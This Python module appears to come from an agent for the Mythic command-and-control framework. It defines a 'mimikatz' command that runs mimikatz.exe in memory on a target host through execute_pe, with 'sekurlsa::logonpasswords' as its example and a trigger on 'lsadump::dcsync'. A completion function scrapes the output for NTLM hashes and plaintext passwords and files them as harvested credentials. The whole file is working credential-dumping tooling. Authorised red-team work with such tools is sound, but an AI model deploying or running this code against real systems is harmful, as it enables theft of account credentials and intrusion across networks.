from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import mslex
from .execute_pe import *


class MimikatzArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="commands",
                cli_name="Commands",
                display_name="Command(s)",
                type=ParameterType.Array,
                description="Mimikatz commands (can be one or more). Each array entry is one command to run",
                parameter_group_info=[ParameterGroupInfo(ui_position=1, required=True)],
            ),
        ]

    async def parse_arguments(self):
        if self.tasking_location == "modal" or (
            self.raw_command_line.startswith("{")
            and self.raw_command_line.endswith("}")
        ) or (
            "-Commands " in self.raw_command_line
        ):
            commands = dict(json.loads(self.command_line))
            commandlist = commands.get("Commands") or commands["commands"]
            self.add_arg("commandline", mslex.join(commandlist, for_cmd = False))
        else:
            self.add_arg("commandline", self.raw_command_line)

        self.remove_arg("commands")


async def parse_credentials(
    task: PTTaskCompletionFunctionMessage,
) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(
        Success=True, TaskStatus="success", Completed=True
    )
    responses = await SendMythicRPCResponseSearch(
        MythicRPCResponseSearchMessage(TaskID=task.TaskData.Task.ID)
    )
    logger.info(responses.Responses)
    for output in responses.Responses:
        mimikatz_out = str(output.Response)
        comment = "task {}".format(output.TaskID)
        if mimikatz_out != "":
            lines = mimikatz_out.split("\r\n")

            for i in range(len(lines)):
                line = lines[i]
                if "SAM Username" in line:
                    if i + 6 > len(lines):
                        continue
                    usernamePieces = line.split(":")
                    username = usernamePieces[1].strip()
                    if "Hash NTLM" in lines[i+6]:
                        pieces = lines[i+6].split(":")
                        if len(pieces) > 1:
                            hash = pieces[1].strip()
                            cred_resp = await SendMythicRPCCredentialCreate(
                                MythicRPCCredentialCreateMessage(
                                    TaskID=task.TaskData.Task.ID,
                                    Credentials=[
                                        MythicRPCCredentialData(
                                            credential_type="hash",
                                            account=username,
                                            realm="",
                                            credential=hash,
                                            comment="Hash NTLM From Mimikatz",
                                        )
                                    ],
                                )
                            )
                            continue
                if "* Username" in line:
                    # Check to see if Password is null
                    if i + 2 >= len(lines):
                        break
                    uname = line.split(" : ")[1].strip()
                    realm = lines[i + 1].split(" : ")[1].strip()
                    passwd = lines[i + 2].split(" : ")[1].strip()
                    passwdType = lines[i+2].split(" : ")[0].strip()
                    if passwdType == "NTLM" and passwd != "":
                        cred_resp = await SendMythicRPCCredentialCreate(
                            MythicRPCCredentialCreateMessage(
                                TaskID=task.TaskData.Task.ID,
                                Credentials=[
                                    MythicRPCCredentialData(
                                        credential_type="hash",
                                        account=uname,
                                        realm=realm,
                                        credential=passwd,
                                        comment=comment,
                                    )
                                ],
                            )
                        )
                    elif passwdType == "Password" and passwd != "" and passwd != "(null)":
                        cred_resp = await SendMythicRPCCredentialCreate(
                            MythicRPCCredentialCreateMessage(
                                TaskID=task.TaskData.Task.ID,
                                Credentials=[
                                    MythicRPCCredentialData(
                                        credential_type="plaintext",
                                        account=uname,
                                        realm=realm,
                                        credential=passwd,
                                        comment=comment,
                                    )
                                ],
                            )
                        )
    return response


class MimikatzCommand(CommandBase):
    cmd = "mimikatz"
    attributes = CommandAttributes(dependencies=["execute_pe"], alias=True)
    needs_admin = False
    help_cmd = "mimikatz [command1] [command2] [...]"
    description = "Execute one or more mimikatz commands (e.g. `mimikatz coffee sekurlsa::logonpasswords`)."
    version = 3
    author = "@djhohnstein"
    argument_class = MimikatzArguments
    attackmapping = [
        "T1134",
        "T1098",
        "T1547",
        "T1555",
        "T1003",
        "T1207",
        "T1558",
        "T1552",
        "T1550",
    ]
    script_only = False
    completion_functions = {"parse_credentials": parse_credentials}

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        commandline = taskData.args.get_arg("commandline")
        # we're going to call execute_pe, so prep args, parse them, and generate the command
        executePEArgs = ExecutePEArguments(command_line=json.dumps(
            {
                "pe_name": "mimikatz.exe",
                "pe_arguments": commandline,
            }
        ))
        await executePEArgs.parse_arguments()
        executePECommand = ExecutePECommand(agent_path=self.agent_code_path,
                                            agent_code_path=self.agent_code_path,
                                            agent_browserscript_path=self.agent_browserscript_path)
        # set our taskData args to be the new ones for execute_pe
        taskData.args = executePEArgs
        # executePE's creat_go_tasking function returns a response for us
        newResp = await executePECommand.create_go_tasking(taskData=taskData)
        # update the response to make sure this gets pulled down as execute_pe instead of mimikatz
        newResp.CommandName = "execute_pe"
        newResp.DisplayParams = commandline
        if "lsadump::dcsync" in commandline or "sekurlsa::logonpasswords" in commandline:
            newResp.CompletionFunctionName = "parse_credentials"
        return newResp

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
